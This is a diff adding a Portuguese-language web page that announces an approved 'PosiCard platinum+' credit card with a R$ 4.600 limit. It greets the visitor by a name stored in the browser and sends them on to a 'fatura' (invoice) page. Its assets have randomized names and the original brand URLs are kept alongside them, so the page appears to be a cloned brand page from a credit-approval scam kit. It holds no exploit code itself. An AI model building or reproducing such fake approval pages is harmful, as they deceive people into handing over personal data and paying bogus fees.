@@ -1,0 +1,429 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <link href="css/05fHXEAOHYvn.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+  
+  
+  
+    <script>
+        // Função para obter os parâmetros UTM da URL
+        function getUTMParameters() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const utmParams = {};
+        
+            // Verifica se existem parâmetros UTM e os armazena em um objeto
+            ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content'].forEach(param => {
+                const value = urlParams.get(param);
+                if (value) {
+                    utmParams[param] = value;
+                }
+            });
+        
+            return utmParams;
+        }
+        
+        // Armazena os parâmetros UTM no localStorage
+        function storeUTMParameters(utmParams) {
+            if (Object.keys(utmParams).length > 0) {
+                localStorage.setItem('utmParams', JSON.stringify(utmParams));
+            }
+        }
+        
+        // Adiciona os parâmetros UTM armazenados em todas as URLs da página
+        function appendUTMParametersToLinks() {
+            const storedUTM = JSON.parse(localStorage.getItem('utmParams'));
+            if (!storedUTM) return;
+        
+            const allLinks = document.querySelectorAll('a[href]');
+            allLinks.forEach(link => {
+                const url = new URL(link.href);
+                Object.keys(storedUTM).forEach(param => {
+                    url.searchParams.set(param, storedUTM[param]);
+                });
+                link.href = url.toString();
+            });
+        }
+        
+        // Quando a página carregar, captura os parâmetros UTM e os armazena
+        document.addEventListener('DOMContentLoaded', () => {
+            const utmParams = getUTMParameters();
+            storeUTMParameters(utmParams);
+            appendUTMParametersToLinks();
+        });
+        </script>
+  
+  
+    <style>
+        .header {
+            background: radial-gradient(934px at 6% 39.5%, rgb(0, 173, 202) 0.2%, rgb(0, 73, 144) 54.8%, rgb(250, 99, 160) 93.4%);
+            color: white;
+            padding: 15px 0;
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: bold;
+            grid-area: top-bar;
+        }
+
+        .main-content {
+            max-width: 450px;
+            background-color: white;
+            text-align: center;
+            padding: 2rem 2rem 1rem 2rem;
+            border-radius: 10px;
+            box-shadow: 0 2px 40px rgba(0, 0, 0, 0.1);
+            margin: 0 auto;
+        }
+
+        .main-content h2 {
+            margin-bottom: 20px;
+        }
+
+        .btn-custom {
+            color: white;
+            border: none;
+            width: 100%;
+            margin-bottom: 10px;
+            background: radial-gradient(934px at 6% 39.5%, rgb(0, 173, 202) 0.2%, rgb(0, 73, 144) 54.8%, rgb(255, 0, 0) 93.4%);
+            font-weight: 600;
+            border-radius: 1rem;
+            padding: .75rem 3rem;
+            letter-spacing: .3px;
+            line-height: 1.15;
+        }
+
+        .btn-custom:hover {
+            color: black !important;
+            background-color: #00adca !important;
+            transform: scale(1.02) !important;
+        }
+
+        .footer {
+            background-color: #ffffff;
+            border-top: solid 1px #e6dddd;
+            color: #000;
+            text-align: center;
+            width: 100%;
+            bottom: 0;
+            grid-area: footer;
+            border-bottom: solid 3px #e6007e;
+            padding: 2rem 0.5rem;
+            position: relative;
+            margin-top: 50px;
+        }
+
+        #conclusao {
+            display: none;
+            /* Esconde o elemento por padrão */
+        }
+
+        #conclusao h4 {
+            color: green;
+            /* Define a cor do texto */
+            font-weight: bold;
+            /* Define o texto em negrito */
+        }
+
+        .char {
+            border-top: solid px #00adca;
+            background-color: #00adca;
+            padding: 2px !important;
+        }
+
+        /* End custom CSS */
+
+        html,
+        body {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-content {
+            flex: 1;
+            /* Faz com que a main-content cresça para ocupar o espaço disponível */
+            max-width: 450px;
+            margin: 30px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .footer {
+            background-color: #ffffff;
+            border-top: solid 1px #e6dddd;
+            color: #000;
+            text-align: center;
+            padding: 10px 0;
+            padding-top: 10px;
+            padding-bottom: 10px;
+            position: relative;
+            width: 100%;
+            bottom: 0;
+        }
+
+        .char {
+            background-color: #e6007e;
+        }
+
+        /* .footer {
+            background-color: #e6007e;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
+            border-top: 1px solid #ddd;
+            width: 100%;
+            position: relative;
+        } */
+
+        /* .footer {
+            background-color: #ffffff;
+            border-top: solid 1px #e6dddd;
+            color: #000;
+            text-align: center;
+            padding: 10px 0;
+            position: fixed;
+            width: 100%;
+            position: relative;
+        } */
+
+        .card-wrapper {
+            max-width: 400px;
+            margin: 0 auto;
+            text-align: center;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            font-family: Arial, sans-serif;
+        }
+
+        .card-credit {
+            background: linear-gradient(135deg, #3b3b3b, #141a1a);
+            border-radius: 15px;
+            padding: 20px;
+            color: #fff;
+            box-shadow: 0px 8px 16px #0003;
+            position: relative;
+            height: 200px;
+            max-width: 350px;
+            margin: 0 auto;
+        }
+
+        .card-details {
+            position: relative;
+            width: 100%;
+            height: 100%;
+        }
+
+        .bank-name {
+            font-size: 18px;
+            font-weight: bold;
+            text-align: left;
+            margin-bottom: 10px;
+        }
+
+        .chip {
+            position: absolute;
+            top: 23px;
+            left: 0px;
+            width: 40px;
+            display: flex;
+            align-items: center;
+        }
+
+        .chip img {
+            /* width: 100%;  */
+            height: auto;
+            width: 30px;
+            /* Ajuste o tamanho do chip */
+            margin-right: 5px;
+            /* Espaço entre o chip e o NFC */
+        }
+
+        .nfc {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            width: 30px;
+        }
+
+        .nfc-img {
+            width: 20px;
+        }
+
+        .card-number {
+            font-size: 16px;
+            letter-spacing: 2px;
+            margin-top: 40px;
+            text-align: left;
+        }
+
+        .valid-thru {
+            font-size: 12px;
+            text-align: left;
+            margin-top: 10px;
+        }
+
+        .name-info {
+            font-size: 14px;
+            text-align: left;
+            margin-top: 5px;
+        }
+
+        .platinum {
+            position: absolute;
+            top: 2px;
+            right: 20px;
+        }
+
+        .mastercard {
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            width: 50px;
+        }
+
+        .mastercard img {
+            width: 100%;
+            /* Garantir que a imagem da Mastercard ocupe todo o contêiner sem distorcer */
+            height: auto;
+        }
+
+        .btn-primary {
+            background-color: #e6007e;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        .btn-primary:hover {
+            background-color: #c20068;
+        }
+
+        .lottie-container {
+            position: fixed;
+            /* Mantém a animação fixa em relação à janela de visualização */
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            pointer-events: none;
+            /* Permite clicar através da animação */
+            z-index: 1000;
+            /* Garante que a animação fique sobre outros elementos */
+        }
+    </style>
+    
+
+    <!-- Meta Pixel Code -->
+<script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1249577276382820');
+    fbq('track', 'PageView');
+    fbq('track', 'ViewContent');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1249577276382820&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- End Meta Pixel Code -->
+
+
+    
+</head>
+
+<body>
+
+    <div style="
+  display: grid;
+  grid-template-areas:
+    'top-bar'
+    'content'
+    'footer';
+  grid-template-rows: auto 1fr auto;
+  min-height: 100vh;
+">
+        <div class="header">
+            <img decoding="async" style="width: 120px;" src="images/Pa2c5pQ4xMua.png" alt="Imagem Centralizada" data-lazy-src="https://d9hhrg4mnvzow.cloudfront.net/lp.posicard.com.br/834c63b6-logo-branco2_105e038000000000000000.png" data-ll-status="loaded" class="entered lazyloaded"><noscript><img decoding="async" style="width: 120px;" src="https://d9hhrg4mnvzow.cloudfront.net/lp.posicard.com.br/834c63b6-logo-branco2_105e038000000000000000.png" alt="Imagem Centralizada"></noscript>
+        </div>
+        <div class="lottie-container">
+            <lottie-player src="https://lottie.host/991e16ca-1d4c-43b1-b5c4-fd68f8ddd267/TL471zxgl2.json" background="transparent.html" speed="1" style="width: 700px; height: 700px;" direction="1" mode="normal" autoplay="">
+            </lottie-player>
+        </div>
+
+        <script src="js/c0YacCpkyqbP.js"></script>
+        <div style="grid-area: content; padding: 0 1rem;">
+            <div style="margin-top: 40px;" class="main-content">
+                <!-- <div class="card-wrapper"> -->
+                <h4>Solicitação concluída com sucesso!</h4>
+                <h4 style="font-weight: 700;">Limite: R$ 4.600,00</h4>
+                <div class="card-credit">
+                    <div class="card-details">
+                        <div class="bank-name">PosiCard</div>
+                        <div class="platinum">platinum+</div>
+                        <div class="chip mt-3">
+                            <img decoding="async" src="images/PGygxMquX8KP.png" alt="Chip do cartão" class="chip-img entered lazyloaded" data-lazy-src="https://cdn-icons-png.flaticon.com/128/9334/9334627.png" data-ll-status="loaded"><noscript><img decoding="async" src="https://cdn-icons-png.flaticon.com/128/9334/9334627.png" alt="Chip do cartão" class="chip-img"></noscript>
+                            <img decoding="async" src="images/EuNFgyhBc584.png" alt="NFC" class="nfc-img entered lazyloaded" data-lazy-src="nfc.png" data-ll-status="loaded">
+                            <noscript><img decoding="async" src="nfc.png" alt="NFC" class="nfc-img"></noscript>
+                        </div>
+                        <div class="nfc">
+                        </div>
+                        <!-- <div class="card-number">5318 39XX XXXX XXXX</div>
+                    <div class="valid-thru">VALIDADE 07/31</div>-->
+                        <div class="name-info" style="position: relative;top: 5rem;font-weight: bold;font-size: 16px;" id="nomeCartao"></div>
+                        <div class="mastercard">
+                            <img decoding="async" src="images/wD6ZhwMvBb7V.svg" alt="Mastercard Logo" data-lazy-src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" data-ll-status="loaded" class="entered lazyloaded"><noscript><img decoding="async" src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard Logo"></noscript>
+                        </div>
+                    </div>
+                </div>
+                <p>Conheça o novo cartão PLATINUM+</p>
+                <p>Além do crédito liberado, você terá esses benefícios:</p>
+                <ul class="text-start">
+                    <li>Desconto em eventos e shows</li>
+                    <li>Cashback de até 5% em compras online</li>
+                    <li>Descontos de até 15% em farmácias Pacheco</li>
+                    <li>Descontos em lojas parceiras</li>
+                    <li>Acesso a salas VIP em aeroportos</li>
+                    <li>Descontos de até 15% em voos com acesso ao Lounge VIP</li>
+                </ul>
+                <button type="button" onclick="location.href='../fatura/index.html'" class=" btn-custom rounded-pill">Continuar</button>
+                <!-- </div> -->
+
+            </div>
+        </div>
+
+        <script>
+            document.addEventListener("DOMContentLoaded", function() {
+                const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuarioUni'));
+                if (dadosUsuario && dadosUsuario.nome) {
+                    const nomeCompleto = dadosUsuario.nome.split(' ');
+                    const primeiroNome = nomeCompleto[0];
+                    const ultimoNome = nomeCompleto[nomeCompleto.length - 1];
+                    const nomeParaMostrar = `${primeiroNome} ${ultimoNome}`;
+                    document.getElementById('nomeCartao').textContent = nomeParaMostrar;
+                } else {
+                    console.error('Nome do usuário não encontrado no localStorage.');
+                }
+            });
+        </script>
+
+        <div class="footer py-4" id="footerChg">
+            © 2024 Positivo Brasil. CNPJ 36.401.269/0001-27. <br> Todos os direitos reservados
+        </div>
+    </div>
+</body></html>
